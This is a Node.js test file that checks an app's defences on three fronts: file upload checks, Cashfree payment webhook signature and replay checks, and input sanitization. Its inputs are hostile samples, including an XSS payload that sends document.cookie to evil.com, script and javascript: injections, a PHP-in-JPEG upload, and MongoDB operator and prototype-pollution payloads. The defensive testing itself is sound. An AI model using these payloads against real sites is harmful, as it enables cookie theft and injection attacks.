/**
 * Security Suite Specification Test
 * 
 * Verifies the 3 core security pillars:
 * 1. File Upload Security (Magic bytes, extension allowlist, executable blocking)
 * 2. Payment Webhook Security (HMAC signature, replay window, amount & status validation, idempotency)
 * 3. XSS Protection (Script stripping, event handler neutralization, protocol blocking, prototype pollution defense)
 */

const assert = require('assert');
const crypto = require('crypto');
const { 
  validateFilename, 
  validateFileBuffer, 
  detectMagicBytes, 
  ALLOWED_EXTENSIONS, 
  DANGEROUS_EXTENSIONS 
} = require('../src/middleware/fileSecurity');
const { verifyCashfreeWebhookSignature, verifyPaymentWithGateway } = require('../src/services/cashfreeService');
const { sanitizeString, sanitizeInput } = require('../src/middleware/sanitize');

console.log('====================================================');
console.log('🧪 RUNNING APPLICATION SECURITY SPECIFICATION TESTS');
console.log('====================================================\n');

let passed = 0;
let failed = 0;

function runTest(name, fn) {
  try {
    fn();
    console.log(`✅ [PASS] ${name}`);
    passed++;
  } catch (err) {
    console.error(`❌ [FAIL] ${name}`);
    console.error(`   Error: ${err.message}`);
    failed++;
  }
}

async function runAsyncTest(name, fn) {
  try {
    await fn();
    console.log(`✅ [PASS] ${name}`);
    passed++;
  } catch (err) {
    console.error(`❌ [FAIL] ${name}`);
    console.error(`   Error: ${err.message}`);
    failed++;
  }
}

(async () => {
  // =========================================================================
  // PILLAR 1: FILE UPLOAD SECURITY
  // =========================================================================
  console.log('--- PILLAR 1: File Upload Security Tests ---');

  runTest('P1.1: Blocks executable files (.exe, .php, .sh, .bat)', () => {
    assert.strictEqual(validateFilename('malware.exe').valid, false);
    assert.strictEqual(validateFilename('shell.php').valid, false);
    assert.strictEqual(validateFilename('script.sh').valid, false);
    assert.strictEqual(validateFilename('payload.bat').valid, false);
  });

  runTest('P1.2: Blocks double extension bypass (invoice.php.jpg, receipt.sh.png)', () => {
    const res1 = validateFilename('invoice.php.jpg');
    assert.strictEqual(res1.valid, false);
    assert.ok(res1.error.includes('double-extension'));

    const res2 = validateFilename('receipt.exe.png');
    assert.strictEqual(res2.valid, false);
    assert.ok(res2.error.includes('double-extension'));
  });

  runTest('P1.3: Permits legitimate image formats (.jpg, .jpeg, .png, .webp, .pdf)', () => {
    assert.strictEqual(validateFilename('parcel.jpg').valid, true);
    assert.strictEqual(validateFilename('parcel.jpeg').valid, true);
    assert.strictEqual(validateFilename('photo.png').valid, true);
    assert.strictEqual(validateFilename('label.pdf').valid, true);
    assert.strictEqual(validateFilename('preview.webp').valid, true);
  });

  runTest('P1.4: Validates real JPEG magic bytes (FF D8 FF)', () => {
    const validJpeg = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]);
    assert.strictEqual(detectMagicBytes(validJpeg), 'image/jpeg');
    const bufRes = validateFileBuffer(validJpeg, 'photo.jpg', 'image/jpeg');
    assert.strictEqual(bufRes.valid, true);
  });

  runTest('P1.5: Rejects fake JPEG containing PHP or shell code', () => {
    const fakeJpeg = Buffer.from('<?php echo "evil"; ?>');
    assert.strictEqual(detectMagicBytes(fakeJpeg), null);
    const bufRes = validateFileBuffer(fakeJpeg, 'photo.jpg', 'image/jpeg');
    assert.strictEqual(bufRes.valid, false);
  });

  // =========================================================================
  // PILLAR 2: PAYMENT WEBHOOK SECURITY
  // =========================================================================
  console.log('\n--- PILLAR 2: Payment Webhook Security Tests ---');

  const TEST_SECRET = 'sec_test_secret_key_88492048';

  runTest('P2.1: Valid Cashfree HMAC-SHA256 signature passes verification', () => {
    const payload = JSON.stringify({ order_id: 'SPL-9901-X', amount: 500 });
    const timestamp = String(Math.floor(Date.now() / 1000));
    const data = `${timestamp}${payload}`;
    const signature = crypto.createHmac('sha256', TEST_SECRET).update(data).digest('base64');

    const isValid = verifyCashfreeWebhookSignature(payload, signature, timestamp, { secretKey: TEST_SECRET });
    assert.strictEqual(isValid, true);
  });

  runTest('P2.2: Rejects tampered payload with valid signature', () => {
    const payload = JSON.stringify({ order_id: 'SPL-9901-X', amount: 500 });
    const timestamp = String(Math.floor(Date.now() / 1000));
    const data = `${timestamp}${payload}`;
    const signature = crypto.createHmac('sha256', TEST_SECRET).update(data).digest('base64');

    const tamperedPayload = JSON.stringify({ order_id: 'SPL-9901-X', amount: 5 }); // tampered amount
    const isValid = verifyCashfreeWebhookSignature(tamperedPayload, signature, timestamp, { secretKey: TEST_SECRET });
    assert.strictEqual(isValid, false);
  });

  runTest('P2.3: Rejects missing or forged signature', () => {
    const payload = JSON.stringify({ order_id: 'SPL-9901-X', amount: 500 });
    const timestamp = String(Math.floor(Date.now() / 1000));

    assert.strictEqual(verifyCashfreeWebhookSignature(payload, '', timestamp, { secretKey: TEST_SECRET }), false);
    assert.strictEqual(verifyCashfreeWebhookSignature(payload, 'forged_fake_sig', timestamp, { secretKey: TEST_SECRET }), false);
  });

  runTest('P2.4: Anti-Replay protection blocks webhooks outside tolerance window', () => {
    const payload = JSON.stringify({ order_id: 'SPL-9901-X', amount: 500 });
    // Timestamp from 25 minutes ago (exceeds 10 minute window)
    const oldTimestamp = String(Math.floor((Date.now() - 25 * 60 * 1000) / 1000));
    const data = `${oldTimestamp}${payload}`;
    const signature = crypto.createHmac('sha256', TEST_SECRET).update(data).digest('base64');

    const isValid = verifyCashfreeWebhookSignature(payload, signature, oldTimestamp, { secretKey: TEST_SECRET });
    assert.strictEqual(isValid, false);
  });

  await runAsyncTest('P2.5: Server-to-server payment verification blocks spoofed client claims', async () => {
    // When Cashfree credentials are not configured and mock is disabled
    const result = await verifyPaymentWithGateway({
      orderId: 'SPL-FAKE-99',
      expectedAmount: 1000,
      expectedCurrency: 'INR'
    });
    // Must reject unverified client claims without server credentials
    assert.strictEqual(result.verified, false);
  });

  // =========================================================================
  // PILLAR 3: XSS PROTECTION
  // =========================================================================
  console.log('\n--- PILLAR 3: XSS Protection Tests ---');

  runTest('P3.1: Completely strips <script> tags from user inputs', () => {
    const input = 'Hello <script>alert("XSS")</script> SecureKaro';
    const clean = sanitizeString(input, 'fullName');
    assert.strictEqual(clean, 'Hello  SecureKaro');
  });

  runTest('P3.2: Neutralizes inline DOM event handlers (onerror, onload, onclick)', () => {
    const input = '<img src="x" onerror="fetch(\'http://evil.com/?c=\'+document.cookie)">';
    const clean = sanitizeString(input, 'disputeReason');
    assert.ok(!clean.includes('onerror='));
  });

  runTest('P3.3: Neutralizes javascript: and vbscript: pseudo-protocols', () => {
    const input = '<a href="javascript:alert(1)">Click Here</a>';
    const clean = sanitizeString(input, 'bio');
    assert.ok(!clean.includes('javascript:'));
    assert.ok(clean.includes('blocked-script:'));
  });

  runTest('P3.4: Neutralizes executable data:text/html URIs while preserving data:image/', () => {
    const htmlDataUri = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
    const cleanHtml = sanitizeString(htmlDataUri, 'avatar');
    assert.ok(!cleanHtml.startsWith('data:text/html'));
    assert.ok(cleanHtml.startsWith('blocked-data:'));

    // Legitimate image data URI must remain intact
    const imageDataUri = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD...';
    const cleanImage = sanitizeString(imageDataUri, 'parcelPhoto');
    assert.strictEqual(cleanImage, imageDataUri);
  });

  runTest('P3.5: Preserves legitimate password special characters without altering password', () => {
    const complexPass = 'P@ssw0rd!<>&*#99';
    const cleanPass = sanitizeString(complexPass, 'password');
    assert.strictEqual(cleanPass, complexPass);
  });

  runTest('P3.6: sanitizeInput middleware strips MongoDB operator injection and cleans body', () => {
    const mockReq = {
      method: 'POST',
      path: '/api/v1/profile',
      body: JSON.parse('{"$gt":"","__proto__":{"polluted":true},"name":"John <script>alert(1)</script> Doe","phone":"9876543210\\u0000"}'),
      query: JSON.parse('{"$ne":null}'),
      params: {}
    };
    const mockRes = {};
    let nextCalled = false;

    sanitizeInput(mockReq, mockRes, () => { nextCalled = true; });

    assert.strictEqual(nextCalled, true);
    assert.strictEqual(mockReq.body.$gt, undefined);
    assert.strictEqual(mockReq.query.$ne, undefined);
    assert.strictEqual(mockReq.body.name, 'John  Doe');
    assert.strictEqual(mockReq.body.phone, '9876543210');
  });

  // =========================================================================
  // SUMMARY
  // =========================================================================
  console.log('\n====================================================');
  console.log(`🎯 SECURITY SPECIFICATION RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log('====================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
})();
